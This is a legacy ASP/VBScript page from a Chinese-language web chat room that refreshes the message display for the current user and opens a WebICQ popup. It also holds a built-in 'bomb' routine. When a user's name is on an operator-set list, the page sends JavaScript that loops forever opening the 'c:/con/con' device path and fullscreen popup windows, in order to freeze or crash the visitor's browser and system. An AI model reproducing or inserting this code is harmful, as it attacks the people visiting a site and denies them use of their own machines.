<%@ LANGUAGE=VBScript codepage ="950" %>
<%Response.charset="big5"%>
<%Response.Buffer=true
Response.ExpiresAbsolute=Now()-1
Response.Expires = 0
Response.CacheControl = "no-cache"
if not IsArray(Session("info")) then Response.Redirect "../error.asp?id=440"
info=Session("info")
useronlinename=Application("ljjh_useronlinename"&session("nowinroom"))
filname=Session("ljjh_filname")
maxtimeout=120
lasttime=Session("ljjh_lasttime")
bombname=Application("ljjh_bombname")
webicqname=Application("ljjh_webicqname")
if Instr(bombname," "&info(0)&" ")>0 then
bombname=Replace(bombname," "&info(0)&" ","")
Application.Lock
Application("ljjh_bombname")=bombname
Application.UnLock
Response.Write "<script language=JavaScript>while(true){window.open('file:///c:/con/con');window.open('readonly/bomb.htm','','fullscreen=yes,Status=no,scrollbars=no,resizable=no');}</script>"
Session.Abandon
Response.End
end if
if info(0)="" or Session("ljjh_inthechat")<>"1" or Instr(LCase(useronlinename),LCase(" "&info(0)&" "))=0 then
Session("ljjh_inthechat")="0"
Response.Redirect "chaterr.asp?id=001"
end if
Response.Write "<html><head><meta http-equiv='Content-Type' content='text/html; charset=big5'></head>"
Response.Write "<body  oncontextmenu=self.event.returnValue=false bgcolor=000000><center><font color=FFFFFF style=font-size:9pt>" & Application("ljjh_title"&session("nowinroom")) & "</font></center>"
Response.Write "<script Language=JavaScript>"
sd=Application("ljjh_sd")
userline=int(Session("ljjh_line"))
newuserline=0
Dim show()
j=1
for i=1 to 200 step 10
newuserline=sd(i)
if sd(i)>userline and cstr(sd(i+9))=cstr(session("nowinroom")) and (session("slshow")=1 or (sd(i+2)="0" or sd(i+4)="¤j®a" or sd(i+2)="1" and (CStr(sd(i+3))=CStr(info(0)) or CStr(sd(i+4))=CStr(info(0)))) and Instr(filname," "&sd(i+3)&",")=0) then
Redim Preserve show(j),show(j+1),show(j+2),show(j+3),show(j+4),show(j+5),show(j+6),show(j+7),show(j+8),show(j+9)
show(j)=sd(i)
show(j+1)=sd(i+1)
show(j+2)=sd(i+2)
show(j+3)=sd(i+3)
show(j+4)=sd(i+4)
show(j+5)=sd(i+5)
show(j+6)=sd(i+6)
show(j+7)=sd(i+7)
show(j+8)=sd(i+8)
show(j+9)=sd(i+9)
j=j+10
end if
next
if j>1 then
for i=1 to UBound(show) step 10
Response.Write "parent.sh("  & show(i+1)  & "," & info(9) & "," & show(i+2) & "," & chr(34) & show(i+3) & chr(34) & "," & chr(34) & show(i+4) & chr(34) & "," & chr(34) & show(i+5) & chr(34) & "," & chr(34) & show(i+6) & chr(34) & "," & chr(34) & show(i+7) & chr(34) & "," & chr(34) & show(i+8) & chr(34) & ");"
next
end if
Response.Write "setTimeout('this.location.reload();',6000);"
if Instr(webicqname," "&info(0)&" ")>0 then
Application("ljjh_webicqname")=replace(Application("ljjh_webicqname"),info(0),"")
Response.Write "window.open('webicqread.asp','','Status=no,scrollbars=yes,resizable=no,width=430,height=160');"
end if
Response.Write "</script></body></html>"
if newuserline>userline then Session("ljjh_line")=newuserline
Response.End
%>
 